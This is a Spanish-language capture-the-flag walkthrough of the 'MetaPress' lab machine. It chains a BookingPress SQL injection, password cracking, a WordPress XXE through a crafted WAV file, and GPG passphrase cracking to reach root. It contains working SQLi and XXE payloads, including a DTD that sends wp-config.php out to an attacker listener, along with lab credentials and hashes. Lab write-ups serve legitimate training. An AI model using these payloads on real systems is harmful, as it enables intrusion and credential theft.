// 01

Resumen

Resumen. WordPress 5.6.2 con el plugin BookingPress < 1.0.11, vulnerable a una SQLi sin autenticar en admin-ajax.php. Con un UNION de 9 columnas se vuelcan los hashes de wp_users; el de manager cae con hashcat (partylikearockstar). Ese usuario solo puede subir medios, lo que basta para CVE-2021-29447 (XXE en la librería de medios de WP 5.6.2): subiendo un .wav con XML malicioso se lee wp-config.php y salen las credenciales del FTP. En el FTP está mailer/send_email.php con la contraseña SMTP de jnelson, que sirve para SSH (user flag). En su home hay una base de passpie cifrada con GPG: se crackea la passphrase (blink182) y se obtiene la contraseña de root.

// NOTA

Versión simplificada (la usada): SQLi a mano (una sola petición), el XXE con dos ficheros, y gpg2john + john + passpie copy. Nada de sqlmap ni de fuerza bruta larga.

Reconocimiento

SHELL
$ sudo nmap -sS -p- -n -Pn --min-rate 2500 --open 10.129.228.95
$ sudo nmap -sV -Pn -p21,22,80 10.129.228.95
$ echo "10.129.228.95 metapress.htb" | sudo tee -a /etc/hosts
$ curl -s http://metapress.htb/ | grep -ioE 'WordPress [0-9.]+|bookingpress[^" ]*'

Lo que se encontró: 21, 22 y 80. La web es WordPress 5.6.2 con el plugin bookingpress-appointment-booking y una página /events/ con el formulario de reservas.

// 04

SQLi en BookingPress

SHELL
# el nonce está en el HTML de /events/
$ curl -s http://metapress.htb/events/ | grep -oE "nonce:'[a-f0-9]+'" | head -1
# nonce:'56fb54bac2' y category_id:1
SHELL
$ curl -s http://metapress.htb/wp-admin/admin-ajax.php \
$ --data-urlencode "action=bookingpress_front_get_category_services" \
$ --data-urlencode "_wpnonce=56fb54bac2" \
$ --data-urlencode "category_id=1" \
$ --data-urlencode "total_service=-1) UNION ALL SELECT 1,GROUP_CONCAT(user_login,0x3a,user_pass),3,4,5,6,7,8,9 FROM wp_users-- -"

Lo que se encontró:

admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70

Por qué funciona: el parámetro total_service se concatena en una consulta sin parametrizar; la tabla tiene 9 columnas y el resultado se devuelve en JSON (columna 2 visible). El *nonce* no caduca entre peticiones.

// 05

Crackear manager y entrar al panel

SHELL
$ echo 'manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70' > wp.hash
$ hashcat -m 400 -a 0 wp.hash /usr/share/wordlists/rockyou.txt --user
# $P$B4aNM28N0E...:partylikearockstar

Con manager / partylikearockstar se entra a /wp-admin (solo puede gestionar medios, pero es justo lo necesario).

// 06

XXE en la librería de medios

SHELL
# 1) DTD que lee wp-config.php y lo exfiltra en base64
$ cat > evil.dtd <<'EOF'
$ <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">
$ <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.12:8000/?p=%file;'>" >
$ EOF
 
# 2) WAV con iXML malicioso
$ printf 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY %% remote SYSTEM '"'"'http://10.10.16.12:8000/evil.dtd'"'"'>%%remote;%%init;%%trick;]>\x00' > payload.wav
 
# 3) servicio que registra la exfiltración y subida del WAV
$ python3 -m http.server 8000 --bind 10.10.16.12 &
$ curl -s -b /tmp/wp.jar -F "async-upload=@payload.wav;type=audio/wav" -F "name=payload.wav" \
$ -F "action=upload-attachment" -F "_wpnonce=868842a8c8" \
$ http://metapress.htb/wp-admin/async-upload.php
$ grep -oE 'GET /\?p=[A-Za-z0-9+/=]+' /tmp/xxe.log | head -1 | sed 's|GET /?p=||' | base64 -d

Lo que se encontró:

define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );

Trampa: el POST de subida devuelve 502 de nginx, pero el XML se procesó igual (la petición XXE sale). No hay que fiarse del código de respuesta.

// 08

Root con passpie

SHELL
$ scp jnelson@metapress.htb:~/.passpie/.keys keys
# quedarse SOLO con el bloque privado
$ python3 - <<'PY'
$ import re
$ t = open('keys').read()
$ m = re.search(r'-----BEGIN PGP PRIVATE KEY BLOCK-----.*?-----END PGP PRIVATE KEY BLOCK-----', t, re.S)
$ open('keys_priv','w').write(m.group(0) + '\n')
$ PY
$ gpg2john keys_priv > gpg.hash
$ john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt
# blink182 (Passpie)
SHELL
$ passpie copy --to stdout --passphrase blink182 root@ssh
# p7qfAZt4_A1xo_0x
$ (sleep 1; echo 'p7qfAZt4_A1xo_0x') | script -qec "su - -c 'id; cat /root/root.txt'" /dev/null

Lo que se encontró: uid=0(root) y la root flag [flag oculta].

Por qué funciona: passpie cifra cada contraseña con la clave GPG del usuario. Si la passphrase de esa clave es débil, se crackea con gpg2john y se descifra la base de datos entera (que incluye la contraseña de root).
